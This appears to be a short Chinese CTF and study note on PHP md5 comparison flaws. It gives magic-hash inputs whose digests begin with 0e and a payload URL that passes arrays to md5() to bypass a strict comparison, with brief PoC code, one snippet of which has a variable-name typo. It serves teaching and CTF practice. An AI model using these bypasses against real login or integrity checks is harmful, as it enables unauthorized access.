# php md5 漏洞

## md5() == '0'

* 原理

对字符串 str 满足 md5(str) 为 **0exxx（xxx全为数字,共30位）**, 则 md5(str) == '0' is true
这是php做字符串 == 比较时，进行类类型转换所致

* poc

```php
$uasername='240610708';  //md5(username)='0e462097431906509019562988736854'
if (md5($username)=="0"){
	echo "Matchs"."<br/>";
}
```

* ctf example

```php
if (isset($_GET['a']) and isset($_GET['b']))
    if ($_GET['a'] != $_GET['b'])
    	if (md5($_GET['a']) === md5($_GET['b']))
        	die('Flag: '.$flag);
    else
        print 'Wrong.';
```

开始没注意到 === 以为是利用php md5()函数的漏洞

```php
<?php
var_dump(md5('240610708') == md5('QNKCDZO'));
var_dump(md5('aabg7XSs') == md5('aabC9RqS'));
?>
```

无果后看到 ===,真要找md5碰撞??

```
http://xxxx.com/web.php?a[]=1&b[]=2
```

成功拿到Flag

在第二个if处if ($_GET['a'] != $_GET['b'])时,因为此时a跟b是两个数组,而两个数组内容不一样,所以为True.

到第三个if时if (md5($_GET['a']) === md5($_GET['b'])),直接$_GET[‘a’]得到的是Array,$_GET[‘b’]也是一样Array,所以md5(Array) === md5(Array)成功绕过


